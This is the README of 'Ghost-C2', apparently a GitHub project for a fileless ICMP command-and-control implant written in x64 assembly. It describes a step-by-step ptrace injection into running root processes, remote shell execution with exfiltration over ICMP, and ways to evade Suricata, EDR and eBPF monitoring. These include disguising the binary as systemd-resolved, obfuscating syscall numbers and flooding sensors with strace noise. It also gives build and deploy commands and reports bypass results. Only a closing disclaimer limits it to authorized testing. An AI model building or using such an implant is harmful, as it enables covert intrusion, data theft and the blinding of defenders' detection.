<div align="center">

```
 ________  ___  ___  ________  ________  _________        ________  ________   
|\   ____\|\  \|\  \|\   __  \|\   ____\|\___   ___\     |\   ____\|\_____  \  
\ \  \___| \ \  \\\  \ \  \|\  \ \  \___|\|___ \  \_|     \ \  \___|\|____|\  \ 
 \ \  \  __ \ \   __  \ \  \\\  \ \_____  \   \ \  \       \ \  \     ____\_\  \
  \ \  \|\  \ \  \ \  \ \  \\\  \|____|\  \   \ \  \       \ \  \___|\____ \  \
   \ \_______\ \__\ \__\ \_______\____\_\  \   \ \__\       \ \______\\_________\
    \|_______|\|__|\|__|\|_______|\_________\   \|__|        \|______\|_________|
                                  \|_________|                                   
```

# Ghost-C2

**A fileless, pure x64 Assembly C2 implant using ICMP as a covert channel.**  
**Zero libc. Zero disk. Invisible to standard EDR hooks.**

![Architecture](https://img.shields.io/badge/Architecture-x86__64-red.svg)
![Language](https://img.shields.io/badge/Language-Pure%20Assembly-green.svg)
![Protocol](https://img.shields.io/badge/Protocol-ICMP-blue.svg)
![OS](https://img.shields.io/badge/OS-Linux-orange.svg)
![Version](https://img.shields.io/badge/Version-3.5-purple.svg)
![Suricata](https://img.shields.io/badge/Suricata%20v8.0.3-Bypassed-brightgreen)

</div>

---

## Overview

Ghost-C2 is a command-and-control framework written entirely in **pure x64 Linux Assembly** with no libc dependencies. Every operation goes through direct syscalls. There are no import tables, no dynamic linker artifacts, and no disk writes.

The C2 channel runs over **raw ICMP sockets**, hiding inside standard diagnostic traffic. The implant lives exclusively in RAM, injected into a running system process via a custom ptrace-based loader.

This project was built to explore how far user-space stealth can go without touching the kernel.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                      OPERATOR MACHINE                       │
│                                                             │
│   ┌──────────────┐                                          │
│   │  client.asm  │  ← Terminal UI: prompt for IP + command  │
│   │  (Operator   │     Encrypts payload with Rolling XOR    │
│   │   Console)   │     Sends ICMP Echo Request (Type 8)     │
│   └──────┬───────┘     Auth key: ID + SEQ = 45,000          │
│          │                                                  │
└──────────┼──────────────────────────────────────────────────┘
           │  Raw ICMP (port-less, stateless)
           │
┌──────────┼──────────────────────────────────────────────────┐
│          │           TARGET MACHINE                         │
│          ▼                                                  │
│   ┌──────────────┐     ┌─────────────────────────────────┐  │
│   │  loader.asm  │────▶│         sniff.asm (PIC)         │  │
│   │  (Phantom    │     │         Lives in RAM only        │  │
│   │   Loader)    │     │         inside host process      │  │
│   └──────────────┘     └────────────────┬────────────────┘  │
│                                         │                   │
│   1. Scans /proc for target PID         │ Receives ICMP Req │
│   2. ptrace ATTACH                      │ Validates auth    │
│   3. Force remote mmap (RW)             │ Decrypts command  │
│   4. Inject PIC shellcode               │ fork+execve       │
│   5. mprotect → RX                      │ memfd_create      │
│   6. Redirect RIP → shellcode           │ Sends ICMP Reply  │
│   7. ptrace DETACH → exits              │ (Type 0, key:     │
│                                         │  ID + SEQ = 55k)  │
└─────────────────────────────────────────┼───────────────────┘
                                          │  Raw ICMP
                                          ▼
                                   [ client.asm ]
                                   Receives chunks
                                   Decrypts + prints
```

---

## Components

### `client.asm` — Operator Console
The attacker-side terminal. Takes a target IP and command from stdin, encrypts the payload, and dispatches it as an ICMP Echo Request. Listens for fragmented ICMP Echo Replies and reconstructs the output.

### `sniff.asm` — PIC Implant Agent
The implant running on the target. Compiled as a **raw binary** (position-independent, no ELF headers) so it can be injected into arbitrary memory addresses. It:
- Listens passively on a raw ICMP socket
- Validates incoming packets using the asymmetric key sum
- Decrypts the command, forks a shell, captures output via `memfd_create`
- Fragments and sends the output back in 56-byte ICMP chunks

### `Phantom_Loader/loader.asm` — Injection Engine
The delivery mechanism. Scans `/proc`, finds a target process by `comm` name, and injects the PIC shellcode into it using a multi-stage ptrace state machine. Exits cleanly after injection — leaves no trace.

---

## Stealth & Evasion Techniques

### Protocol Mimicry
Every outgoing ICMP packet is structured to be indistinguishable from a standard Linux `ping`:

```
Offset  0-7   : ICMP Header (Type, Code, Checksum, ID, SEQ)
Offset  8-15  : Dynamic RDTSC timestamp  ← mimics struct timeval
Offset 16-31  : 0x10, 0x11 ... 0x1F     ← exact Linux iputils padding
Offset 32+    : Encrypted payload        ← past most DPI scan depth
```

Signature-based IDS engines (Suricata, Snort) see standard padding and stop scanning before reaching the payload. This is the **Stealth Gap**.

### Asymmetric Authentication
The implant ignores all packets where `ID + SEQ ≠ 45,000`. Random internet scanners, automated security tools, and honeypots will never trigger it. The implant replies with packets where `ID + SEQ = 55,000`, making the two directions mathematically distinct and preventing OS echo confusion.

### Rolling XOR Cipher
Both directions are encrypted with a progressively shifting key:

```nasm
mov dl, 0x42      ; seed
xor [rsi], dl     ; encrypt byte
add dl, 0x07      ; shift key
inc rsi
loop .loop
```

This keeps Shannon entropy low — AES-encrypted ICMP traffic scores ~8.0 and triggers DPI anomaly alerts. Rolling XOR produces entropy that looks like compressed or naturally noisy data. **No cryptographic constants, no S-boxes, nothing for YARA to match.**

### Adaptive Jitter (RDTSC-based)
Packet transmission intervals are randomized using the CPU's hardware timestamp counter, not software timers. This produces timing patterns that are mathematically non-periodic — ML-based NTA engines (Darktrace, Cisco Stealthwatch) require periodicity to flag C2 beaconing.

```nasm
rdtsc
xor rdx, rdx
mov ecx, 900000000
div ecx             ; RDX = random 0–900ms
add edx, 100000000  ; minimum 100ms
```

### Fileless Execution via `memfd_create`
Command output never touches disk:

```
fork()
  child: dup2(memfd, stdout) → execve("/bin/sh", ["-c", cmd])
  parent: wait4() → lseek(0) → read loop → fragment → send
```

The memfd is named `[shm]`, matching the format of legitimate shared memory mappings in `/proc/PID/fd`. Standard `lsof` output shows nothing suspicious.

### W^X Memory Injection (Phantom Loader)
Modern kernel mitigations forbid RWX memory. The loader uses a two-phase approach:

```
Phase 1: Remote mmap with PROT_READ | PROT_WRITE
         → Inject shellcode via PTRACE_POKEDATA
Phase 2: Remote mprotect → PROT_READ | PROT_EXEC
         → No page is ever simultaneously W and X
```

EDR memory scanners looking for RWX anomalies find nothing.

### Libc-Free Syscall Obfuscation
All syscall numbers are split across two instructions to defeat static analysis and simple grep-based scanners:

```nasm
; sys_memfd_create (319)
mov rax, 300
add rax, 19
syscall

; sys_ptrace (101)
mov rax, 99
add rax, 2
syscall
```

---

## Phantom Loader — ptrace Injection Chain

The loader performs a deterministic, multi-step injection without any external dependencies:

```
1. Open /proc with sys_getdents64
2. Scan linux_dirent64 entries for numeric directories (PIDs)
3. Read /proc/<PID>/comm → compare against target name
4. ptrace(PTRACE_ATTACH, pid)
5. wait4() loop with branchless sleep (cmovz/cmovs)
6. PTRACE_GETREGS → save register state + RIP
7. PTRACE_POKEDATA → write syscall opcode (0x050F) at RIP
8. PTRACE_SETREGS → configure mmap arguments in registers
9. PTRACE_SINGLESTEP → execute remote mmap
10. wait4() → PTRACE_GETREGS → read mmap return value (new address)
11. PTRACE_POKEDATA loop → write 1444-byte PIC payload (8 bytes/iter)
12. PTRACE_SETREGS → configure mprotect (PROT_READ | PROT_EXEC)
13. PTRACE_SINGLESTEP → execute remote mprotect
14. PTRACE_POKEDATA → restore original bytes at RIP
15. PTRACE_SETREGS → set RIP = injected payload address
16. PTRACE_DETACH → host process resumes, now running the implant
```

The loader exits immediately after step 16. The host process continues its normal operation with Ghost-C2 running inside it.

> **Known Limitation:** Processes confined by AppArmor or SELinux (enforce mode) will block `mprotect` across different memory regions. The loader targets **unconfined** root processes such as `cron` or `VBoxService`. A bypass for MAC-confined services is planned for v4.x.

---

## Build & Usage

### Prerequisites
- NASM (Netwide Assembler)
- GNU ld (linker)
- Root privileges (required for raw sockets and ptrace)

### Standalone Agent (v3.0 compatible)

```bash
# Build the agent
nasm -f elf64 sniff.asm -o sniff.o && ld sniff.o -o systemd-resolved

# Build the client
nasm -f elf64 client.asm -o client.o && ld client.o -o client

# Deploy (target machine)
sudo ./systemd-resolved

# Operate (attacker machine)
sudo ./client
```

> **Tip:** Name the binary at least 15 characters (e.g., `systemd-resolved`) to provide enough stack buffer for clean `argv[0]` overwrite without environment variable bleed.

## Verification

After deployment, the agent disappears from standard process listings:

```bash
$ ps aux | grep systemd-resolved
root  3887  0.0  0.0  192  16 ?  Ss  19:42  0:00 systemd-resolved
```

The only way to identify the true binary is through `/proc`:

```bash
$ sudo ls -la /proc/3887/exe
lrwxrwxrwx 1 root root 0 ... /proc/3887/exe -> /path/to/systemd-resolved
```

---

### Phantom Loader (v3.5)

The PIC shellcode is pre-compiled and already embedded in `loader.asm`. Only rebuild it if you modify the agent source:

```bash
# (Optional) Recompile PIC shellcode after modifying sniff_pic.asm
cd Phantom_Loader
nasm -f bin sniff_pic.asm -o shellcode.bin

# Build the loader
nasm -f elf64 loader.asm -o loader.o && ld loader.o -o loader

# (Optional) Binary Optimization & Anti-Forensics
strip --strip-all loader

# Execute (target process must be running)
sudo strace ./loader
```

💡 Evasion Note (Syscall Noise Masking via LotL): Execution is intentionally wrapped with strace. This leverages a Living off the Land (LotL) technique to generate massive amounts of legitimate debugging noise. By flooding kernel-level eBPF sensors (like Falco) with standard PTRACE_ATTACH logs, the actual malicious injection is masked through "Alert Flooding". This effectively buries the single injection anomaly within a sea of standard debug operations, often causing defense mechanisms and analysts to dismiss the event as a false-positive.

The target process name is hardcoded in `loader.asm`. See inline comments to change it.

---

## Empirical Results

Tested in a controlled lab environment against active traffic inspection:

| Test | Result |
|---|---|
| Suricata v8.0.3 (Emerging Threats ruleset) | ✅ Bypassed |
| Suricata v8.0.3 (Custom ICMP payload rules) | ✅ Bypassed |
| DigitalOcean FRA1 gateway | ✅ 100% exfiltration success |
| Alerts generated during ~25KB exfiltration | 0 |

---

## Syscall Reference

Ghost-C2 interacts directly with the Linux kernel. No wrappers, no libc:

| Syscall | Number | Usage |
|---|---|---|
| `sys_socket` | 41 | Raw ICMP socket creation |
| `sys_recvfrom` | 45 | Passive ICMP packet capture |
| `sys_sendto` | 44 | ICMP reply transmission |
| `sys_memfd_create` | 319 | Anonymous RAM file for output |
| `sys_dup2` | 33 | stdout/stderr redirection |
| `sys_execve` | 59 | Shell command execution |
| `sys_fork` | 57 | Process isolation |
| `sys_nanosleep` | 35 | Jitter implementation |
| `sys_ptrace` | 101 | Process injection + anti-debug |
| `sys_prctl` | 157 | Process masquerade + anti-dump |
| `sys_getdents64` | 217 | /proc directory parsing |
| `sys_mmap` | 9 | Remote memory allocation |
| `sys_mprotect` | 10 | W^X permission switch |

---

## Roadmap

**v4.x — MAC Bypass Research**

The primary research target is bypassing AppArmor and SELinux confined processes. Current candidates:

- ROP-based execution using gadgets from the target's own executable memory (Living off the Land in memory)
- Dynamic ASLR defeat for gadget address resolution
- Eliminating `mprotect` dependency entirely by executing within existing RX pages

This is a long-term R&D effort. Pure assembly ROP chain construction with dynamic gadget discovery is a non-trivial problem space.

---

## Why No Interactive TTY?

The absence of a PTY is an architectural decision, not a limitation:

**Protocol integrity:** ICMP is stateless. Emulating TCP-like ordered delivery for a TTY stream would bloat the codebase and destroy the lightweight design.

**Volumetric stealth:** An interactive shell generates ICMP traffic for every keystroke. This creates a detectable frequency spike. Ghost-C2 is designed to stay below anomaly detection thresholds.

**EDR surface:** Allocating a PTY requires `/dev/ptmx` and `ioctl` calls that EDRs heavily monitor. Spawning an interactive shell without a legitimate parent daemon leaves behavioral artifacts.

Ghost-C2 is a hyper-stealth command execution and exfiltration implant. Interactivity trades invisibility for convenience — this project chose invisibility.

---



## Resources

- **Blog / Technical Writeup:** [netacoding.com/posts/icmp-ghost](https://netacoding.com/posts/icmp-ghost)
- **Author:** [github.com/JM00NJ](https://github.com/JM00NJ)

---

## Legal Disclaimer

This project is developed for **educational purposes and authorized penetration testing only**. The author is not responsible for any misuse. Operating this tool against systems you do not own or have explicit written permission to test is illegal.
